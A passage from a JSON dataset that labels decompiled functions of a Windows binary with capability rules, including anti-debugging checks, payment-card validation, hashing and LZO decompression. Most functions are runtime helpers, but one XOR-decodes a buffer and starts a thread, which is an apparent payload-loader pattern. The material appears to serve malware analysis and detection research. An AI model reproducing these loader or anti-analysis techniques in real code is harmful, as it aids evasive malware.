4;\n                uStack112 = uVar8;\n                if (uVar7 == 0) goto code_r0x000140004da9;\ncode_r0x000140004b6b:\n                afStack168[0] = *pfVar9;\n                fcn.140004090(afStack168, &iStack120);\n                goto code_r0x000140004b80;\n            case 0x68:\n                uVar4 = puVar15[1];\n                if (uVar4 == 0x68) {\n                    uVar4 = puVar15[2];\n                    iVar17 = 5;\n                    puVar16 = puVar15 + 2;\n                    uVar7 = 4;\n                }\n                else {\n                    iVar17 = 1;\n                    uVar7 = 4;\n                }\n                break;\n            case 0x6a:\n            case 0x74:\n            case 0x7a:\n                uVar4 = puVar15[1];\n                iVar17 = 3;\n                uVar7 = 4;\n                break;\n            case 0x6c:\n                uVar4 = puVar15[1];\n                if (uVar4 == 0x6c) {\n                    uVar4 = puVar15[2];\n                    iVar17 = 3;\n                    puVar16 = puVar15 + 2;\n                    uVar7 = 4;\n                }\n                else {\n                    iVar17 = 2;\n                    uVar7 = 4;\n                }\n                break;\n            case 0x6d:\n                arg1_00 = sub.msvcrt.dll_strerror(uVar1);\n                fcn.140002fe0(arg1_00, &iStack120);\n                goto code_r0x00014000479c;\n            case 0x6e:\n                pfVar9 = *in_stack_00000028;\n                if (iVar17 == 5) {\n                    *pfVar9 = uStack84;\n                }\n                else if (iVar17 == 1) {\n                    *pfVar9 = uStack84;\n                }\n                else if ((iVar17 == 2) || (iVar17 != 3)) {\n                    *pfVar9 = uStack84;\n                }\n                else {\n                    *pfVar9 = uStack84;\n                }\ncode_r0x000140004b80:\n                in_stack_00000028 = in_stack_00000028 + 1;\n                goto code_r0x00014000479c;\n            case 0x70:\n                if ((uVar7 == 0) && (uStack112 == arg1)) {\n                    iStack104 = 0x10;\n                    uStack112 = arg1 | 0x200;\n                }\n                fcn.1400030d0(0x78, *in_stack_00000028, &iStack120);\n                in_stack_00000028 = in_stack_00000028 + 1;\n                goto code_r0x00014000479c;\n            case 0x73:\n                if (iVar17 - 2U < 2) goto code_r0x000140004f1a;\n                fcn.140002fe0(*in_stack_00000028, &iStack120);\ncode_r0x000140004b49:\n                in_stack_00000028 = in_stack_00000028 + 1;\n                goto code_r0x00014000479c;\n            }\n            puVar15 = puVar16;\n            if (uVar4 == 0) {\n                return uStack84;\n            }\n        } while( true );\n    }\n    if (((uStack112 & 0x4000) != 0) || (uStack84 < iStack80)) {\n        if ((uStack112 & 0x2000) == 0) {\n            *(iStack120 + uStack84) = uVar8;\n        }\n        else {\n            sub.msvcrt.dll_fputc();\n        }\n    }\n    uStack84 = uVar3 + 1;\n    puVar16 = puVar14;\n    goto code_r0x00014000479c;\ncode_r0x000140004dca:\n    fcn.140002ca0(0x25, &iStack120);\ncode_r0x00014000479c:\n    uVar8 = *puVar16;\n    puVar14 = puVar16 + 1;\n    uVar7 = *puVar16;\n    if (uVar7 == 0) {\n        return uStack84;\n    }\n    goto code_r0x0001400047ae;\n}\n",
        "token_count": 5442
    },
    "140006f3": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.140006f30(ulong *arg1)\n\n{\n    ulong uVar1;\n    bool bVar2;\n    \n    if (arg1 != NULL) {\n        if (9 < *(arg1 + 1)) {\n    // WARNING: Could not recover jumptable at 0x000140007fe8. Too many branches\n    // WARNING: Treating indirect jump as call\n            (*_sym.imp.msvcrt.dll_free)();\n            return;\n        }\n        fcn.140006d10(0);\n        bVar2 = *0x140071bb0 == 2;\n        uVar1 = *(*(arg1 + 1) * 8 + 0x140071b60);\n        *(*(arg1 + 1) * 8 + 0x140071b60) = arg1;\n        *arg1 = uVar1;\n        if (bVar2) {\n    // WARNING: Could not recover jumptable at 0x000140006f8c. Too many branches\n    // WARNING: Treating indirect jump as call\n            (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x140071bc0);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 263
    },
    "140006e4": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.140006e40(ulong arg1)\n\n{\n    uint64_t uVar1;\n    int32_t iVar2;\n    ulong *puVar3;\n    uint64_t uVar4;\n    int32_t iVar5;\n    \n    fcn.140006d10(0);\n    iVar2 = *0x140071bb0;\n    if (arg1 < 10) {\n        puVar3 = *(arg1 * 8 + 0x140071b60);\n        if (puVar3 != NULL) {\n            *(arg1 * 8 + 0x140071b60) = *puVar3;\n            goto joined_r0x000140006ec5;\n        }\n        iVar5 = 1 << (arg1 & 0x1f);\n        uVar1 = (iVar5 + 9) * 4 - 1;\n        uVar4 = uVar1 >> 3;\n        if (0x120 < (*0x14006d020 + -0x2800e24c >> 3) + uVar4) goto code_r0x000140006eaa;\n        puVar3 = *0x14006d020;\n        *0x14006d020 = *0x14006d020 + (uVar1 & 0xfffffffffffffff8);\n    }\n    else {\n        iVar5 = 1 << (arg1 & 0x1f);\n        uVar4 = iVar5 * 4 + 0x23U >> 3 & 0xffffffff;\ncode_r0x000140006eaa:\n        puVar3 = sub.msvcrt.dll_malloc(uVar4 << 3);\n        if (puVar3 == NULL) {\n            return;\n        }\n    }\n    iVar2 = *0x140071bb0;\n    *(puVar3 + 1) = arg1;\n    *(puVar3 + 0xc) = iVar5;\njoined_r0x000140006ec5:\n    if (iVar2 == 2) {\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x140071bc0);\n    }\n    puVar3[2] = 0;\n    return;\n}\n",
        "token_count": 471
    },
    "14000706": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.140007060(ulong arg1)\n\n{\n    int32_t iVar1;\n    ulong uVar2;\n    ulong *puVar3;\n    \n    fcn.140006d10(0);\n    if (*0x140071b68 == NULL) {\n        if ((*0x14006d020 + -0x2800e24c >> 3) + 5U < 0x121) {\n            puVar3 = *0x14006d020;\n            *0x14006d020 = *0x14006d020 + 5;\n        }\n        else {\n            puVar3 = sub.msvcrt.dll_malloc(0x28);\n            if (puVar3 == NULL) {\n                return;\n            }\n        }\n        iVar1 = *0x140071bb0;\n        puVar3[1] = *0x14006e6e8;\n    }\n    else {\n        puVar3 = *0x140071b68;\n        *0x140071b68 = **0x140071b68;\n        iVar1 = *0x140071bb0;\n    }\n    if (iVar1 == 2) {\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x140071bc0);\n    }\n    uVar2 = *0x14006e6f0;\n    *(puVar3 + 3) = arg1;\n    puVar3[2] = uVar2;\n    return;\n}\n",
        "token_count": 318
    },
    "14000728": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nint64_t fcn.140007280(int64_t arg1, ulong arg2)\n\n{\n    uint32_t uVar1;\n    int64_t iVar2;\n    ulong *puVar3;\n    ulong *arg2_00;\n    \n    if (((arg2 & 3) == 0) || (arg1 = fcn.140006fa0(arg1, *(((arg2 & 3) - 1) * 4 + 0x14006e5a0), 0),  arg1 != 0)) {\n        arg2._0_4_ = arg2 >> 2;\n        if (arg2 != 0) {\n            puVar3 = *0x140071240;\n            if (*0x140071240 == NULL) {\n                fcn.140006d10(1);\n                puVar3 = *0x140071240;\n                if (*0x140071240 == NULL) {\n                    puVar3 = fcn.140006e40(1);\n                    if (puVar3 == NULL) {\n                        *0x140071240 = NULL;\n                        return 0;\n                    }\n                    *0x140071240 = puVar3;\n                    *(puVar3 + 0x14) = 0x27100000001;\n                    *puVar3 = 0;\n                }\n                if (*0x140071bb0 == 2) {\n                    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x140071be8);\n                }\n            }\n            while( true ) {\n                arg2_00 = puVar3;\n                uVar1 = arg2 & 1;\n                arg2._0_4_ = arg2 >> 1;\n                if (uVar1 != 0) {\n                    iVar2 = fcn.140007120(arg1, arg2_00);\n                    if (iVar2 == 0) goto code_r0x000140007373;\n                    fcn.140006f30(arg1);\n                    arg1 = iVar2;\n                }\n                if (arg2 == 0) break;\n                puVar3 = *arg2_00;\n                if (*arg2_00 == NULL) {\n                    fcn.140006d10(1);\n                    puVar3 = *arg2_00;\n                    if (puVar3 == NULL) {\n                        puVar3 = fcn.140007120(arg2_00, arg2_00);\n                        *arg2_00 = puVar3;\n                        if (puVar3 == NULL) goto code_r0x000140007373;\n                        *puVar3 = 0;\n                    }\n                    if (*0x140071bb0 == 2) {\n                        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x140071be8);\n                    }\n                }\n            }\n        }\n    }\n    else {\ncode_r0x000140007373:\n        arg1 = 0;\n    }\n    return arg1;\n}\n",
        "token_count": 632
    },
    "14000303": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid fcn.140003030(ulong arg1, int64_t arg2, int64_t arg3)\n\n{\n    uint32_t uVar1;\n    uint8_t uVar2;\n    int64_t iVar3;\n    uint8_t *puVar4;\n    uint8_t auStack12 [12];\n    \n    uVar1 = *(arg3 + 8);\n    *(arg3 + 0x10) = 0xffffffff;\n    if (arg1 == 0) {\n        uVar2 = 0x2b;\n        if ((uVar1 & 0x100) == 0) {\n            if ((uVar1 & 0x40) == 0) {\n                puVar4 = auStack12;\n            }\n            else {\n                puVar4 = auStack12 + 1;\n                auStack12[0] = 0x20;\n            }\n            goto code_r0x00014000306b;\n        }\n    }\n    else {\n        uVar2 = 0x2d;\n    }\n    puVar4 = auStack12 + 1;\n    auStack12[0] = uVar2;\ncode_r0x00014000306b:\n    iVar3 = 0;\n    do {\n        puVar4[iVar3] = *(arg2 + iVar3) & 0xdf | uVar1 & 0x20;\n        iVar3 = iVar3 + 1;\n    } while (iVar3 != 3);\n    fcn.140002e90(auStack12, (puVar4 + 3) - auStack12, arg3);\n    return;\n}\n",
        "token_count": 350
    },
    "14000527": {
        "rules": [
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t fcn.140005270(int64_t arg1, int64_t arg2)\n\n{\n    uint32_t *puVar1;\n    uint32_t *puVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint64_t uVar6;\n    int64_t iVar7;\n    uint32_t *puVar8;\n    uint64_t uVar9;\n    uint32_t *puVar10;\n    uint64_t uVar11;\n    int32_t iVar12;\n    uint32_t *puVar13;\n    uint32_t *puVar14;\n    uint64_t uVar15;\n    \n    if (*(arg1 + 0x14) < *(arg2 + 0x14)) {\n        return 0;\n    }\n    iVar12 = *(arg2 + 0x14) + -1;\n    puVar8 = arg2 + 0x18;\n    puVar1 = arg1 + 0x18;\n    puVar2 = puVar8 + iVar12;\n    puVar10 = puVar1 + iVar12;\n    uVar11 = *puVar10 / (*puVar2 + 1);\n    iVar5 = uVar11;\n    if (*puVar2 + 1 <= *puVar10) {\n        uVar15 = 0;\n        uVar9 = 0;\n        puVar13 = puVar1;\n        puVar14 = puVar8;\n        do {\n            uVar3 = *puVar14;\n            puVar14 = puVar14 + 1;\n            uVar6 = uVar3 * uVar11 + uVar15;\n            uVar15 = uVar6 >> 0x20;\n            iVar7 = (*puVar13 - (uVar6 & 0xffffffff)) - uVar9;\n            *puVar13 = iVar7;\n            uVar9 = iVar7 >> 0x20 & 1;\n            puVar13 = puVar13 + 1;\n        } while (puVar14 <= puVar2);\n        if (*puVar10 == 0) {\n            while ((puVar10 = puVar10 + -1,  puVar1 < puVar10 && (*puVar10 == 0))) {\n                iVar12 = iVar12 + -1;\n            }\n            *(arg1 + 0x14) = iVar12;\n            iVar4 = fcn.140007510(arg1, arg2);\n            goto joined_r0x000140005333;\n        }\n    }\n    iVar4 = fcn.140007510(arg1, arg2);\njoined_r0x000140005333:\n    if (-1 < iVar4) {\n        uVar11 = 0;\n        puVar10 = puVar1;\n        do {\n            uVar3 = *puVar8;\n            puVar8 = puVar8 + 1;\n            iVar7 = (*puVar10 - uVar3) - uVar11;\n            *puVar10 = iVar7;\n            uVar11 = iVar7 >> 0x20 & 1;\n            puVar10 = puVar10 + 1;\n        } while (puVar8 <= puVar2);\n        puVar8 = puVar1 + iVar12;\n        if (*puVar8 == 0) {\n            while ((puVar8 = puVar8 + -1,  puVar1 < puVar8 && (*puVar8 == 0))) {\n                iVar12 = iVar12 + -1;\n            }\n            iVar5 = iVar5 + 1;\n            *(arg1 + 0x14) = iVar12;\n        }\n        else {\n            iVar5 = iVar5 + 1;\n        }\n    }\n    return iVar5;\n}\n",
        "token_count": 805
    },
    "14000756": {
        "rules": [
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint64_t fcn.140007560(int64_t arg1, int64_t arg2)\n\n{\n    uint64_t uVar1;\n    int32_t *piVar2;\n    uint64_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint32_t *puVar6;\n    int64_t iVar7;\n    uint64_t uVar8;\n    int64_t iVar9;\n    int64_t iVar10;\n    int64_t iVar11;\n    uint32_t *puVar12;\n    uint64_t uVar13;\n    int32_t *piVar14;\n    int32_t iVar15;\n    uint32_t uVar16;\n    uint32_t *puVar17;\n    bool bVar18;\n    \n    iVar5 = *(arg2 + 0x14);\n    iVar15 = *(arg1 + 0x14) - iVar5;\n    bVar18 = iVar15 < 0;\n    iVar10 = arg2;\n    if (iVar15 == 0) {\n        puVar6 = arg1 + 0x18U + iVar5;\n        puVar12 = arg2 + 0x18 + iVar5 * 4;\n        do {\n            puVar6 = puVar6 + -1;\n            puVar12 = puVar12 + -1;\n            if (*puVar6 != *puVar12) {\n                if (*puVar6 < *puVar12) goto code_r0x0001400076e3;\n                goto code_r0x0001400075c0;\n            }\n        } while (arg1 + 0x18U < puVar6);\n        iVar7 = fcn.140006e40(0);\n        if (iVar7 != 0) {\n            *(iVar7 + 0x14) = 1;\n        }\n    }\n    else {\n        iVar15 = 0;\n        if (bVar18) {\ncode_r0x0001400076e3:\n            iVar15 = 1;\n            iVar10 = arg1;\n            arg1 = arg2;\n        }\ncode_r0x0001400075c0:\n        iVar7 = fcn.140006e40(*(arg1 + 8));\n        if (iVar7 != 0) {\n            *(iVar7 + 0x10) = iVar15;\n            uVar16 = *(arg1 + 0x14);\n            uVar8 = uVar16;\n            iVar11 = 0x18;\n            uVar13 = 0;\n            puVar6 = arg1 + 0x18 + uVar8 * 4;\n            uVar3 = iVar10 + 0x18 + *(iVar10 + 0x14) * 4;\n            do {\n                iVar9 = (*(arg1 + iVar11) - *(iVar10 + iVar11)) - uVar13;\n                iVar5 = iVar9;\n                *(iVar7 + iVar11) = iVar5;\n                iVar11 = iVar11 + 4;\n                uVar13 = iVar9 >> 0x20 & 1;\n            } while (iVar11 + iVar10 < uVar3);\n            uVar1 = (uVar3 - iVar10) - 0x19;\n            iVar11 = (uVar1 & 0xfffffffffffffffc) + 4;\n            if (uVar3 < iVar10 + 0x19U) {\n                iVar11 = 4;\n            }\n            puVar17 = arg1 + 0x18 + iVar11;\n            piVar2 = iVar7 + 0x18 + iVar11;\n            puVar12 = puVar17;\n            piVar14 = piVar2;\n            if (puVar17 < puVar6) {\n                do {\n                    uVar4 = *puVar12;\n                    puVar12 = puVar12 + 1;\n                    iVar5 = uVar4 - uVar13;\n                    *piVar14 = iVar5;\n                    uVar13 = uVar4 - uVar13 >> 0x20 & 1;\n                    piVar14 = piVar14 + 1;\n                } while (puVar12 < puVar6);\n                iVar10 = piVar2 + (puVar6 + (-1 - puVar17) & 0xfffffffffffffffcU);\n            }\n            else {\n                uVar13 = uVar1 & 0xfffffffffffffffc;\n                if (uVar3 < iVar10 + 0x19U) {\n                    uVar13 = 0;\n                }\n                iVar10 = iVar7 + 0x18 + uVar13;\n            }\n            while (iVar5 == 0) {\n                piVar2 = iVar10 + -4;\n                iVar10 = iVar10 + -4;\n                uVar16 = uVar8 - 1;\n                uVar8 = uVar16;\n                iVar5 = *piVar2;\n            }\n            *(iVar7 + 0x14) = uVar16;\n        }\n    }\n    return iVar7;\n}\n",
        "token_count": 1072
    },
    "14000179": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid fcn.14000179c(int64_t arg1, ulong arg2, int64_t arg3)\n\n{\n    ulong uVar1;\n    int64_t arg1_00;\n    int64_t iVar2;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_HeapCreate)(0x40000, 0, 0);\n    arg1_00 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1, 0, 10);\n    if (0 < arg2) {\n        arg1_00 = (*_sym.imp.KERNEL32.dll_HeapReAlloc)(uVar1, 0, arg1_00, arg2);\n    }\n    for (iVar2 = 0; iVar2 < arg2; iVar2 = iVar2 + 1) {\n        *(arg1_00 + iVar2) = *(arg3 + (iVar2 & 7)) ^ *(arg1 + iVar2);\n    }\n    fcn.140001783();\n    fcn.140001586(arg1_00);\n    (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0);\n    return;\n}\n",
        "token_count": 248
    },
    "140002b8": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid fcn.140002b80(int64_t arg1, ulong arg2, ulong arg3)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.1400046b0(0x4000, arg1, 0, arg2);\n    *(arg1 + iVar1) = 0;\n    return;\n}\n",
        "token_count": 75
    },
    "14000391": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nvoid fcn.140003910(int64_t *arg1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    ulong *puVar4;\n    int64_t *arg1_00;\n    uint64_t arg2;\n    uchar *puVar5;\n    uchar *puVar6;\n    ulong auStack96 [5];\n    uchar auStack56 [6];\n    uint16_t uStack50;\n    ulong uStack48;\n    ulong var_8h;\n    \n    if (*(arg1 + 0x14) == -3) {\n        uStack48 = 0;\n        auStack96[0] = 0x140003a11;\n        puVar4 = sub.msvcrt.dll_localeconv();\n        arg1_00 = &stack0xffffffffffffffce;\n        auStack96[0] = 0x140003a26;\n        iVar1 = fcn.140007d80(arg1_00, *puVar4, 0x10, &stack0xffffffffffffffd0);\n        if (iVar1 < 1) {\n            uStack50 = *(arg1 + 3);\n        }\n        else {\n            *(arg1 + 3) = uStack50;\n        }\n        *(arg1 + 0x14) = iVar1;\n    }\n    else {\n        uStack50 = *(arg1 + 3);\n        arg1_00 = arg1;\n    }\n    arg2 = uStack50;\n    if (uStack50 == 0) {\n        auStack96[0] = 0x1400039ed;\n        fcn.140002ca0(0x2e, arg1);\n        return;\n    }\n    auStack96[0] = 0x14000394d;\n    iVar3 = fcn.140002b40(arg1_00);\n    iVar3 = -iVar3;\n    uStack48 = 0;\n    *(&stack0xffffffffffffffa0 + iVar3) = 0x140003969;\n    iVar1 = fcn.140007ae0(&stack0xffffffffffffffc8 + iVar3, arg2);\n    if (iVar1 < 1) {\n        *(&stack0xffffffffffffffa0 + iVar3) = 0x140003a4d;\n        fcn.140002ca0(0x2e, arg1);\n    }\n    else {\n        puVar5 = &stack0xffffffffffffffc8 + iVar3;\n        do {\n            while( true ) {\n                puVar6 = puVar5 + 1;\n                if (((*(arg1 + 1) & 0x4000) != 0) ||\n                   (iVar2 = *(arg1 + 0x24),  *(arg1 + 5) != iVar2 && iVar2 <= *(arg1 + 5))) break;\ncode_r0x00014000398a:\n                *(arg1 + 0x24) = iVar2 + 1;\n                puVar5 = puVar6;\n                if (&stack0xffffffffffffffc9 + (iVar1 - 1) + iVar3 == puVar6) {\n                    return;\n                }\n            }\n            if ((*(arg1 + 1) & 0x2000) == 0) {\n                *(*arg1 + *(arg1 + 0x24)) = *puVar5;\n                iVar2 = *(arg1 + 0x24);\n                goto code_r0x00014000398a;\n            }\n            *(&stack0xffffffffffffffa0 + iVar3) = 0x1400039bd;\n            sub.msvcrt.dll_fputc();\n            *(arg1 + 0x24) = *(arg1 + 0x24) + 1;\n            puVar5 = puVar6;\n        } while (&stack0xffffffffffffffc9 + (iVar1 - 1) + iVar3 != puVar6);\n    }\n    return;\n}\n",
        "token_count": 866
    },
    "140007ae": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nint64_t fcn.140007ae0(uchar *arg1, uint64_t arg2)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uchar auStack29 [5];\n    \n    if (arg1 == NULL) {\n        arg1 = auStack29;\n    }\n    uVar1 = sub.msvcrt.dll____mb_cur_max_func();\n    uVar2 = sub.msvcrt.dll____lc_codepage_func();\n    iVar3 = fcn.140007a50(arg1, arg2 & 0xffff, uVar2, uVar1);\n    return iVar3;\n}\n",
        "token_count": 142
    },
    "140003e4": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.140003e40(ulong arg1, ulong arg2, ulong arg3, int64_t *arg4)\n\n{\n    char *pcVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    char *pcVar5;\n    uint64_t arg1_00;\n    char *pcVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    ulong auStack112 [5];\n    char acStack72 [8];\n    ulong uStack64;\n    \n    iVar8 = 1;\n    arg3._0_4_ = arg3 + -1;\n    arg1_00 = arg3;\n    while (arg3._0_4_ = arg3 / 10,  arg3 != 0) {\n        iVar8 = iVar8 + 1;\n    }\n    iVar2 = *(arg4 + 0x2c);\n    if (iVar2 == -1) {\n        *(arg4 + 0x2c) = 2;\n        iVar2 = 2;\n    }\n    if (iVar8 <= iVar2) {\n        iVar8 = iVar2;\n    }\n    iVar2 = *(arg4 + 0xc) - (iVar8 + 2);\n    if (*(arg4 + 0xc) <= iVar8 + 2) {\n        iVar2 = -1;\n    }\n    *(arg4 + 0xc) = iVar2;\n    uStack64 = 0x140003ed3;\n    fcn.140003a60(arg1, arg2, 1, arg4);\n    uVar9 = *(arg4 + 1);\n    *(arg4 + 2) = *(arg4 + 0x2c);\n    *(arg4 + 1) = uVar9 | 0x1c0;\n    uStack64 = 0x140003ef4;\n    fcn.140002ca0(uVar9 & 0x20 | 0x45, arg4);\n    *(arg4 + 0xc) = *(arg4 + 0xc) + iVar8 + 1;\n    iVar8 = *(arg4 + 2);\n    uVar9 = *(arg4 + 1);\n    iVar2 = *(arg4 + 0xc);\n    auStack112[0] = 0x1400035d7;\n    iVar3 = fcn.140002b40(arg1_00);\n    iVar3 = -iVar3;\n    pcVar1 = &stack0xffffffffffffffb8 + iVar3;\n    if ((uVar9 & 0x80) == 0) {\ncode_r0x0001400035f6:\n        pcVar5 = pcVar1;\n        if (arg1_00 != 0) goto code_r0x000140003602;\n    }\n    else {\n        if (-1 < arg1_00) {\n            uVar9 = uVar9 & 0xffffff7f;\n            *(arg4 + 1) = uVar9;\n            goto code_r0x0001400035f6;\n        }\n        arg1_00 = -arg1_00;\ncode_r0x000140003602:\n        pcVar5 = pcVar1;\n        while( true ) {\n            pcVar6 = pcVar5;\n            pcVar5 = pcVar6 + 1;\n            uVar4 = arg1_00 / 10;\n            *pcVar6 = arg1_00 + uVar4 * -10 + '0';\n            if (arg1_00 < 10) break;\n            arg1_00 = uVar4;\n            if ((((pcVar1 != pcVar5) && ((uVar9 & 0x1000) != 0)) && (*(arg4 + 4) != 0)) &&\n               ((pcVar5 - pcVar1 & 0x8000000000000003U) == 3)) {\n                *pcVar5 = ',';\n                pcVar5 = pcVar6 + 2;\n            }\n        }\n    }\n    pcVar6 = pcVar5;\n    if (iVar8 < 1) {\ncode_r0x0001400036c0:\n        pcVar5 = pcVar6;\n        if ((pcVar1 != pcVar6) || (iVar8 == 0)) goto code_r0x0001400036d1;\n    }\n    else {\n        iVar7 = iVar8 - (pcVar5 - pcVar1);\n        if (0 < iVar7) {\n            pcVar6 = pcVar5 + iVar7;\n            *(&stack0xffffffffffffff90 + iVar3) = 0x1400036c0;\n            sub.msvcrt.dll_memset(pcVar5, 0x30, iVar7);\n            goto code_r0x0001400036c0;\n        }\n        pcVar6 = pcVar1;\n        if (pcVar1 != pcVar5) goto code_r0x0001400036d1;\n    }\n    *pcVar6 = '0';\n    pcVar5 = pcVar6 + 1;\ncode_r0x0001400036d1:\n    if (0 < iVar2) {\n        iVar2 = iVar2 - (pcVar5 - pcVar1);\n        *(arg4 + 0xc) = iVar2;\n        if (0 < iVar2) {\n            if ((uVar9 & 0x1c0) != 0) {\n                *(arg4 + 0xc) = iVar2 + -1;\n            }\n            if ((iVar8 < 0) && ((uVar9 & 0x600) == 0x200)) {\n                iVar8 = *(arg4 + 0xc);\n                *(arg4 + 0xc) = iVar8 + -1;\n                if (0 < iVar8) {\n                    *(&stack0xffffffffffffff90 + iVar3) = 0x1400038b9;\n                    sub.msvcrt.dll_memset(pcVar5, 0x30, iVar8);\n                    *(arg4 + 0xc) = 0xffffffff;\n                    pcVar5 = pcVar5 + iVar8;\n                }\n            }\n            else if (((uVar9 & 0x400) == 0) && (iVar8 = *(arg4 + 0xc),  *(arg4 + 0xc) = iVar8 + -1,  0 < iVar8)) {\n                do {\n                    *(&stack0xffffffffffffff90 + iVar3) = 0x1400038ed;\n                    fcn.140002ca0(0x20, arg4);\n                    iVar8 = *(arg4 + 0xc);\n                    *(arg4 + 0xc) = iVar8 + -1;\n                } while (0 < iVar8);\n                uVar9 = *(arg4 + 1);\n            }\n        }\n    }\n    if ((uVar9 & 0x80) == 0) {\n        if ((uVar9 & 0x100) == 0) {\n            if ((uVar9 & 0x40) != 0) {\n                *pcVar5 = ' ';\n                pcVar5 = pcVar5 + 1;\n            }\n        }\n        else {\n            *pcVar5 = '+';\n            pcVar5 = pcVar5 + 1;\n        }\n    }\n    else {\n        *pcVar5 = '-';\n        pcVar5 = pcVar5 + 1;\n    }\n    if (pcVar1 < pcVar5) {\n        do {\n            pcVar5 = pcVar5 + -1;\n            if (((uVar9 & 0x4000) == 0) && (iVar8 = *(arg4 + 0x24),  *(arg4 + 5) == iVar8 || *(arg4 + 5) < iVar8)) {\ncode_r0x00014000373a:\n                *(arg4 + 0x24) = iVar8 + 1;\n            }\n            else {\n                if ((uVar9 & 0x2000) == 0) {\n                    *(*arg4 + *(arg4 + 0x24)) = *pcVar5;\n                    iVar8 = *(arg4 + 0x24);\n                    goto code_r0x00014000373a;\n                }\n                *(&stack0xffffffffffffff90 + iVar3) = 0x140003772;\n                sub.msvcrt.dll_fputc();\n                *(arg4 + 0x24) = *(arg4 + 0x24) + 1;\n            }\n            if (pcVar1 == pcVar5) break;\n            uVar9 = *(arg4 + 1);\n        } while( true );\n    }\n    iVar8 = *(arg4 + 0xc);\n    while( true ) {\n        *(arg4 + 0xc) = iVar8 + -1;\n        if (iVar8 < 1) break;\n        if (((*(arg4 + 1) & 0x4000) != 0) ||\n           (iVar2 = *(arg4 + 0x24),  iVar8 = iVar8 + -1,  *(arg4 + 5) != iVar2 && iVar2 <= *(arg4 + 5))) {\n            if ((*(arg4 + 1) & 0x2000) == 0) {\n                *(*arg4 + *(arg4 + 0x24)) = 0x20;\n                iVar2 = *(arg4 + 0x24);\n                iVar8 = *(arg4 + 0xc);\n            }\n            else {\n                *(&stack0xffffffffffffff90 + iVar3) = 0x1400037ca;\n                sub.msvcrt.dll_fputc();\n                iVar2 = *(arg4 + 0x24);\n                iVar8 = *(arg4 + 0xc);\n            }\n        }\n        *(arg4 + 0x24) = iVar2 + 1;\n    }\n    return;\n}\n",
        "token_count": 2149
    },
    "14000712": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
